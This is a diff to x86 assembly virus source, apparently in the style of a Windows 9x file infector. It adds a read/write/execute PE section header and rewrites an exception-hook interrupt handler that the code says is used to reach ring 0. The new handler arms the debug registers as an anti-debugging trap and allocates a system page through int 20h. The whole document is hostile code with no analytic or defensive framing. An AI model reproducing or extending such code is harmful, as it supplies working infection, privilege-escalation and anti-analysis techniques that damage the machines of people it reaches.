@@ -115,6 +115,18 @@ times 128-($-.IMAGE_DOS_HEADER) db 0
     .COM_Descriptor             dq 0
     .Reserved                   dq 0
 .OPTIONAL_HEADER_END:
+.IMAGE_SECTION_HEADER:
+    .Name                   db '.text', 0, 0, 0 ; 8-byte UTF-8 name
+    .VirtualSize            dd _SizeOfCode      ; Memory size (unaligned)
+    .VirtualAddress         dd 00001000h        ; RVA (Must match BaseOfCode)
+    .SizeOfRawData          dd _SizeOfRawData   ; Disk size (Aligned to 200h)
+    .PointerToRawData       dd 00000200h        ; File offset to virus_start
+    .PointerToRelocations   dd 00000000h        ; 0 for EXEs
+    .PointerToLinenumbers   dd 00000000h        ; 0 for EXEs
+    .NumberOfRelocations    dw 0000h
+    .NumberOfLinenumbers    dw 0000h
+    .Characteristics        dd 0E0000020h       ; RWE (Read/Write/Execute) + Code
+times 508-($-$$) db 0  ; Padding
 dd VirusSize
 
 ;********************************************
@@ -178,6 +190,7 @@ mov [ebx+2h], si
 pop esi
 
 
+
 int HookExceptionNumber    ; To get ring 0
 
 
@@ -185,9 +198,17 @@ ExceptionOccured:
 
 
 IntHandler:
-iret
+mov ecx, dr3
+jcxz AllocateSysPage
+iretd
 
-Allocate_Page:
+AllocateSysPage:
+mov ebx, 'Free'
+mov dr3, ebx
+mov ebx, dr7
+or ebx, 00002080h  ; Hehe, if anyone treis to debug my virus, it will throw an exception
+mov dr7, ebx       ; And then I, can handle it
+
 mov eax, 01h
 xor ebx, ebx
 mov ecx, 01h
@@ -196,7 +217,7 @@ xor esi, esi
 mov edi, esi
 int 20h
 dd 00010053h
-ret
+
 
 virus_end:
 VirusSize equ $
